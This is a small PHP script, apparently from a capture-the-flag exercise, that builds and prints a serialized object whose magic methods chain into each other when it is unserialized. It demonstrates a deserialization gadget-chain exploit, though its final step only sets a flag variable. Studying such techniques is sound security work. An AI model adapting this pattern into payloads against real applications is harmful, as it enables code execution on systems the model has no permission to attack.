<?php

$flag = 0;

class Deep{
    public $m1;
    public $m2;
	public function __construct()
    {
        $this->m1 = new Dark();
    }
    public function __destruct(){
        $this->m1->boy();
    
    }
}

class Dark{
    public $m1;
    public $m2;
	public function __construct()
    {
        $this->m1 = new Fantasy();
    }
    public function boy(){
        $this->m1->next_door();
    
}

}

class Fantasy{
    public $m1;
    public $m2;
	public function __construct()
    {
        $this->m1 = new Happy();
    }
    public function __call($next_door,$arr){
        $s = $this->m1;
        $s();
    
}

}

class Happy{
    public $m1;
    public $m2;
	public function __construct()
    {
        $this->m1 = new New_year();
    }
    public function __invoke(){
        $this->m2="cnss".$this->m1;
    
}

}

class New_year{
    public $s1;
    public $s2;
	public function __construct()
    {
        $this->s1 = new Copied_from_somewhere();
    }
    public function __toString(){
        $this->s1->not_copied_shell();
        return "1";
    
}

}

class Copied_from_somewhere{
    public function not_copied_shell(){
        global $flag;
        $flag = 1;
    
}
}
$a = new Deep;
echo serialize($a)."<br />";
#echo urlencode(serialize($a))."<br />";
?>